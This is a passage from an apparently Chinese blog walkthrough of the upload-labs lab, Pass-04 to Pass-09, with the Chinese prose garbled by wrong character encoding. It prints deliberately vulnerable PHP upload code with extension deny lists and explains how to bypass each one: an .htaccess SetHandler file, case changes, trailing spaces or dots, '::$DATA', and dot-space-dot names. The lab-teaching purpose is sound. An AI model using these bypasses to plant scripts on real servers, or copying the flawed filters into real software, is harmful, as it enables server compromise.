class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°é»‘åå•è¿‡æ»¤äº†<code>php5</code>ï¼Œ<code>php</code>ç­‰è®¸å¤šçš„åç¼€ï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤<code>.htaccsess</code>æ–‡ä»¶ã€‚</p>
<p>è¿™é‡Œå¯ä»¥ä¸Šä¼ <code>.htaccsess</code>æ–‡ä»¶,å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">SetHandler application/x-httpd-php </span><br></pre></td></tr></table></figure>

<p>è¿™æ ·æ‰€æœ‰æ–‡ä»¶éƒ½ä¼šå½“æˆphpæ¥è§£æã€‚</p>
<h4 id="Pass-05-å¤§å°å†™ç»•è¿‡"><a href="#Pass-05-å¤§å°å†™ç»•è¿‡" class="headerlink" title="Pass-05(å¤§å°å†™ç»•è¿‡)"></a><strong>Pass-05(å¤§å°å†™ç»•è¿‡)</strong></h4><p>æºç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //é¦–å°¾å»ç©º</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¿‡æ»¤äº†<code>.htaccsess</code>æ–‡ä»¶ï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤å¤§å°å†™ã€‚</p>
<p>ç›´æ¥ä¸Šä¼ <code>1.PHP</code>å³å¯ã€‚</p>
<h4 id="Pass-06-ç©ºæ ¼ç»•è¿‡"><a href="#Pass-06-ç©ºæ ¼ç»•è¿‡" class="headerlink" title="Pass-06(ç©ºæ ¼ç»•è¿‡)"></a><strong>Pass-06(ç©ºæ ¼ç»•è¿‡)</strong></h4><p>æºä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        $file_name = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¿‡æ»¤äº†å°å†™ï¼Œä½†æ˜¯æ²¡æœ‰å»é™¤æ–‡ä»¶åé¦–å°¾çš„ç©ºæ ¼ã€‚</p>
<p>æ‰€ä»¥æ­¤å¤„å¯ä»¥åˆ©ç”¨windowsç³»ç»Ÿçš„å‘½åè§„åˆ™è¿›è¡Œç»•è¿‡ã€‚</p>
<p>windowsä¸‹<code>xx.jpg[ç©ºæ ¼]</code> æˆ–<code>xx.jpg.</code>è¿™ä¸¤ç±»æ–‡ä»¶éƒ½æ˜¯ä¸å…è®¸å­˜åœ¨çš„ï¼Œè‹¥è¿™æ ·å‘½åï¼Œwindowsä¼šé»˜è®¤é™¤å»ç©ºæ ¼æˆ–ç‚¹ã€‚</p>
<p>æ­¤å¤„ä¼šåˆ é™¤æœ«å°¾çš„ç‚¹ï¼Œä½†æ˜¯æ²¡æœ‰å»æ‰æœ«å°¾çš„ç©ºæ ¼ï¼Œå› æ­¤ä¸Šä¼ ä¸€ä¸ª<code>.php[ç©ºæ ¼]</code>æ–‡ä»¶å³å¯ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200502225824112.png" style="high:70%;width:70%;" />

<h4 id="Pass-07-ç‚¹ç»•è¿‡"><a href="#Pass-07-ç‚¹ç»•è¿‡" class="headerlink" title="Pass-07(ç‚¹ç»•è¿‡)"></a><strong>Pass-07(ç‚¹ç»•è¿‡)</strong></h4><p>æºä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //é¦–å°¾å»ç©º</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ç›¸æ¯”äºç¬¬6å…³ï¼ŒåŠ ä¸Šäº†é¦–å°¾å»ç©ºï¼Œä½†æ˜¯å´å°‘äº†å°¾éƒ¨å»ç‚¹ã€‚åˆ©ç”¨windowsæ–‡ä»¶å‘½åè§„åˆ™ç»•è¿‡ã€‚</p>
<p><strong>ç»•è¿‡æ–¹æ³•ï¼š</strong></p>
<p>ç›´æ¥ä¸Šä¼ <code>.php.</code>åç¼€å³å¯ã€‚</p>
<h4 id="Pass-08-DATAç»•è¿‡"><a href="#Pass-08-DATAç»•è¿‡" class="headerlink" title="Pass-08(::$DATAç»•è¿‡)"></a><strong>Pass-08(::$DATAç»•è¿‡)</strong></h4><p>æºä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™</span><br><span class="line">        $file_ext = trim($file_ext); //é¦–å°¾å»ç©º</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ï¼Œç›¸æ¯”äºå‰ä¸€å…³ï¼Œå°‘äº†å»é™¤æ–‡ä»¶å<code>::$DATA</code>ï¼Œè¿™é‡Œåˆ©ç”¨äº†windowsçš„ä¸€ä¸ªç‰¹æ€§</p>
<p>NTFSæ–‡ä»¶ç³»ç»ŸåŒ…æ‹¬å¯¹å¤‡ç”¨æ•°æ®æµçš„æ”¯æŒï¼Œåœ¨Windowsä¸­ï¼Œæ­¤é»˜è®¤æ•°æ®æµç§°ä¸º<code>::$DATA</code>ã€‚</p>
<p>ç®€å•è®²å°±æ˜¯åœ¨php+windowsçš„æƒ…å†µä¸‹ï¼šå¦‚æœæ–‡ä»¶ååŠ ä¸Š<code>::$DATA</code>ä¼šæŠŠ<code>::$DATA</code>ä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†ï¼Œä¸ä¼šæ£€æµ‹åç¼€åï¼Œä¸”ä¿æŒ<code>::$DATA</code>ä¹‹å‰çš„æ–‡ä»¶åã€‚</p>
<p><strong>ç»•è¿‡æ–¹æ³•ï¼š</strong></p>
<p>ç›´æ¥ä¸Šä¼ <code>1.php::$DATA</code>å³å¯ã€‚</p>
<h4 id="Pass-09-ç‚¹-ç©ºæ ¼-ç‚¹ç»•è¿‡"><a href="#Pass-09-ç‚¹-ç©ºæ ¼-ç‚¹ç»•è¿‡" class="headerlink" title="Pass-09(ç‚¹+ç©ºæ ¼+ç‚¹ç»•è¿‡)"></a><strong>Pass-09(ç‚¹+ç©ºæ ¼+ç‚¹ç»•è¿‡)</strong></h4><p>æºä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //é¦–å°¾å»ç©º</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„ä»£ç å®‰å…¨æ€§é«˜ï¼Œé»‘åå•ï¼Œå¤§å°å†™ï¼Œå»ç‚¹å»ç©ºæ ¼ã€‚å»<code>::$DATA</code>ã€‚</p>
<p>ä½†æ˜¯è¿™é‡Œæœ‰é€»è¾‘æ¼æ´ï¼Œæ˜¯å…ˆå»ç‚¹ï¼Œå†é¦–å°¾å»ç©ºï¼Œéƒ½åªè¿›è¡Œä¸€æ¬¡ã€‚æ‰€ä»¥è¿™é‡Œå¯ä»¥æ„é€ ç‚¹ç©ºæ ¼ç»•è¿‡ï¼Œä¹Ÿæ˜¯åˆ©ç”¨äº†Windowsçš„ç‰¹æ€§ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä»ç¬¬ä¸‰å…³åˆ°ç¬¬ä¹å…³ï¼Œå¦‚æœç›®æ ‡æœåŠ¡å™¨æ˜¯windowsç³»ç»Ÿçš„è¯ï¼Œå‡å¯ç”¨ç‚¹ç©ºæ ¼ç‚¹ç»•è¿‡ã€‚</p>
